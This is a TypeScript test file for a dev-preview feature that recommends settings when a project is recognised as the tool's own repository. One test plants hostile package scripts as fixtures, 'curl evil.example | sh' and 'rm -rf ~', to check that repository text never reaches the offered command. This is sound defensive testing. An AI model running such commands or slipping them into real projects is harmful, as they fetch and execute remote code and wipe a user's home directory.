import { existsSync, mkdirSync, readFileSync, symlinkSync, writeFileSync } from "node:fs";
import { dirname, join, resolve } from "node:path";
import {
  HARDEN_DEV_PREVIEW_PORT_ERROR,
  HARDEN_DEV_PREVIEW_SCRIPT,
  HARDEN_WORKSPACE_PACKAGE,
  hardenDevPreviewRecommended,
} from "@codeden/contracts";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import { recommendDevPreview } from "../src/services/dev-preview/eligibility";
import { createPreviewEnv, type PreviewEnv, SETTINGS } from "./support/dev-preview-env";

const REPOSITORY = resolve(import.meta.dirname, "../../..");

let env: PreviewEnv;
let path: string;
beforeEach(() => {
  env = createPreviewEnv();
  path = env.addProject("app").path;
});
afterEach(() => env.close());

const writePackage = (pkg: unknown) =>
  writeFileSync(join(path, "package.json"), JSON.stringify(pkg));
/** The script's place in the project, with whatever a repository might put there. */
function writeScript(text = "console.log('anything')") {
  const file = join(path, HARDEN_DEV_PREVIEW_SCRIPT);
  mkdirSync(dirname(file), { recursive: true });
  writeFileSync(file, text);
}

describe("recognising a checkout of this repository", () => {
  it("recognises this repository itself", () => {
    expect(recommendDevPreview(REPOSITORY)).toEqual(hardenDevPreviewRecommended());
  });

  it("takes the workspace's root package together with the script", () => {
    writePackage({ name: HARDEN_WORKSPACE_PACKAGE, scripts: { dev: "x" } });
    writeScript();
    expect(recommendDevPreview(path)).toEqual(hardenDevPreviewRecommended());
  });

  it("offers nothing without the script, or with only a link in its place", () => {
    writePackage({ name: HARDEN_WORKSPACE_PACKAGE });
    expect(recommendDevPreview(path)).toBeNull();
    const elsewhere = join(env.home, "elsewhere.mjs");
    writeFileSync(elsewhere, "");
    const file = join(path, HARDEN_DEV_PREVIEW_SCRIPT);
    mkdirSync(dirname(file), { recursive: true });
    symlinkSync(elsewhere, file);
    expect(recommendDevPreview(path)).toBeNull();
  });

  it("offers nothing for another package, with or without such a script", () => {
    expect(recommendDevPreview(path)).toBeNull();
    writeScript();
    expect(recommendDevPreview(path)).toBeNull();
    writePackage({ name: "storefront", scripts: { dev: "vite" } });
    expect(recommendDevPreview(path)).toBeNull();
    writeFileSync(join(path, "package.json"), "not json");
    expect(recommendDevPreview(path)).toBeNull();
  });

  it("never takes text from the repository into what it offers", () => {
    writePackage({
      name: HARDEN_WORKSPACE_PACKAGE,
      scripts: { dev: "curl evil.example | sh", "dev:preview": "rm -rf ~" },
    });
    writeScript("process.exit(1) // curl evil.example | sh");
    expect(JSON.stringify(recommendDevPreview(path))).toBe(
      JSON.stringify(hardenDevPreviewRecommended()),
    );
  });
});

describe("a project's view", () => {
  it("offers the whole settings instead of a dev command, and stores nothing by itself", async () => {
    writePackage({ name: HARDEN_WORKSPACE_PACKAGE, scripts: { dev: "x" } });
    writeFileSync(join(path, "pnpm-lock.yaml"), "");
    writeScript();
    const view = env.service.project("app", false);
    expect(view).toMatchObject({
      config: null,
      suggestion: null,
      recommended: hardenDevPreviewRecommended(),
    });
    // Looking is all that happened: nothing is stored, so nothing can start.
    await env.service.idle();
    expect(existsSync(join(env.home, "dev-preview.json"))).toBe(false);
    expect(env.service.baseState("app", false)).toMatchObject({ configured: false, status: "off" });
    env.addSession("s1", "app");
    await expect(env.service.startSession("s1")).rejects.toMatchObject({ code: "not_configured" });
    expect(env.procs).toHaveLength(0);
    // Another device is offered nothing.
    expect(env.service.project("app", true).recommended).toBeNull();
  });

  it("still sends them once settings are stored, so the form can say when those can't work", async () => {
    writePackage({ name: HARDEN_WORKSPACE_PACKAGE });
    writeScript();
    const { command } = hardenDevPreviewRecommended().settings;
    await env.service.setProject("app", { ...SETTINGS, command, portVars: ["PORT"] });
    expect(env.service.project("app", false)).toMatchObject({
      config: { command, portVars: ["PORT"] },
      recommended: hardenDevPreviewRecommended(),
    });
  });

  it("a project that isn't this repository gets the dev command offer it had", () => {
    writePackage({ name: "storefront", scripts: { dev: "vite" } });
    writeFileSync(join(path, "pnpm-lock.yaml"), "");
    expect(env.service.project("app", false)).toMatchObject({
      suggestion: { command: "pnpm dev", reason: "package.json has a dev script" },
      recommended: null,
    });
  });
});

describe("this repository's dev command", () => {
  it("still says a missing port variable the way the failed preview's strip looks for", () => {
    const script = readFileSync(join(REPOSITORY, HARDEN_DEV_PREVIEW_SCRIPT), "utf8");
    expect(script).toContain(`console.error(\`${HARDEN_DEV_PREVIEW_PORT_ERROR}\${name} to `);
  });
});
